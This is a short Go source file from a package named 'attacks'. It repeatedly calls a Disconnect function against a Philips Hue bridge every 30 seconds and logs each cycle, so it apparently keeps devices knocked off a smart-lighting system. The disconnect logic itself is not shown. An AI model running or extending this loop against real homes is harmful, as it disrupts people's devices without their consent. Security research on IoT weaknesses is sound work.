package attacks

import (
	"context"
	"github.com/amimof/huego"
	"log"
	"time"
)

const (
	WaitPeriod = 30 * time.Second
)

func KeepDisconnecting(ctx context.Context, bridge *huego.Bridge) error {
	cycleCount := 0

	for {
		cycleCount++
		log.Printf("Starting disconnect cycle #%d\n", cycleCount)

		err := Disconnect(ctx, bridge)
		if err != nil {
			log.Printf("Disconnected cycle #%d failed\n", cycleCount)
			return err
		}

		log.Printf("Disconnect cycle #%d finished, waiting %d seconds for next cycle\n", cycleCount, WaitPeriod/time.Second)
		time.Sleep(WaitPeriod)
	}
}
